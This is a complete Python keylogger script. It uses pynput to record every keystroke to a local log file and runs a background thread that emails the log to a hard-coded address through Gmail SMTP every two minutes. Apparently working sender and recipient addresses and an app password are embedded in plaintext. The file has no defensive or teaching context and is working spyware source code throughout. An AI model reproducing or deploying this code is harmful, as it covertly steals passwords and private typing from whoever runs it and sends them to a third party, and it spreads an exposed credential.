from pynput.keyboard import Key, Listener
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import os
#import sys
#import subprocess
def create_log_file():
    with open("log.txt", "w"):
        pass

#Check if log.txt file exists, if not, create it
if not os.path.exists("log.txt"):
    create_log_file()
    
keys = []

def keypress(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))

def writefile(key):
    with open("log.txt", 'a') as f:
        try:
            char = key.char
            keystr = str(char)
            if keystr != 'None':
                f.write(keystr)
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.shift:
                pass
            elif key == Key.ctrl_l or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.esc or key == Key.backspace:
                pass
            else:
                f.write(str(key))

def keyrelease(key):
    if key == Key.esc:
        return False

def send_email_thread():
    while True:
        send_email()
        time.sleep(120)

def send_email():
    sender_email = "hadinawfal.123@gmail.com"
    receiver_email = "h07729647@gmail.com"
    subject = "Email with Attachment"
    body = "Keystrokes in the attached log file."
    attachment_file = "log.txt"

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with open(attachment_file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {attachment_file}")
    message.attach(part)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, "lnql xafs vibi knzy")  #Replace "your_password" with your actual email password
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Email with attachment sent successfully")

email_thread = threading.Thread(target=send_email_thread)
email_thread.start()

with Listener(on_press=writefile, on_release=keyrelease) as listener:
    listener.join()
